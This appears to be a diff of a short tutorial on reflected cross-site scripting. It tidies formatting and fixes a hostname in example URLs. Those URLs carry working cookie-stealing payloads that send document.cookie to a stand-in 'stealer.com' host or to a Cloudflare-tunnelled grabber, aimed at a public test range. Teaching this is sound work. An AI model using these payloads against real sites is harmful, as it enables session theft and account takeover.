@@ -4,9 +4,9 @@ One way to exploit is to inject a code with a script that reads the cookie. The 
 
 https://victim.com/site?vuln_param=X<script>fetch('https://stealer.com/grab?c='+encodeURIComponent(document.cookie))</script>
 
-<b>Try this example to test a parameter in the body-part of a site:</b>
+Try this example to test a parameter in the body-part of a site:
 https://public-firing-range.appspot.com/reflected/parameter/body/400?q=b<h1>HALLO</h1><script>alert("VULNERABLE");</script>
 
 Try this with a running Flask cookie grabber and a cloudflare tunnel:
-https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
+https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER].trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
                                                                                                                 
